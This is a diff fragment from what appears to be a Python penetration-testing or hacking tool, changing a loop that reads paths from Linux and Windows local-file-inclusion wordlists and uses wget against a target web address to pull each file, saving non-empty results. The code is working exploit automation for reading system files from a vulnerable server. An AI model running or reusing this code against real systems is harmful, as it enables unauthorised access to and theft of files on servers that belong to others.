@@ -3482,13 +3482,27 @@ while True:
                file1 = open("../TREADSTONE/linuxlfi.txt", 'r')
                Lines = file1.readlines()
                for line in Lines:
-                  remotCOM("wget --quiet " + WEB.rstrip(" ") + line + " > " + line.rstrip("/")  + ".txt")
+                  file = line.replace("/","-")
+                  file = file.replace("\\","-")
+                  file = file.replace(" ","_")
+                  file = file.rstrip("\n")
+                  ffile = "file" + file
+                  remotCOM("wget -q -O " + ffile + " " + WEB + line)
+                  if os.stat(ffile).st_size == 0:
+                     localCOM("rm " + ffile)
                print("[+] Completed...")
             else:
                file1 = open("../TREADSTONE/windowslfi.txt", 'r')
                Lines = file1.readlines()
                for line in Lines:
-                  remotCOM("wget --quiet " + WEB.rstrip(" ") + line + " > " + line.rstrip("/")  + ".txt")
+                  file = line.replace("/","-")
+                  file = file.replace("\\","-")
+                  file = file.replace(" ","_")
+                  file = file.rstrip("\n")
+                  ffile = "file" + file
+                  remotCOM("wget -q -O " + ffile + " " + WEB + line)
+                  if os.stat(ffile).st_size == 0:
+                     localCOM("rm " + ffile)
                print("[+] Completed...")
             localCOM("cd ..")
          else:
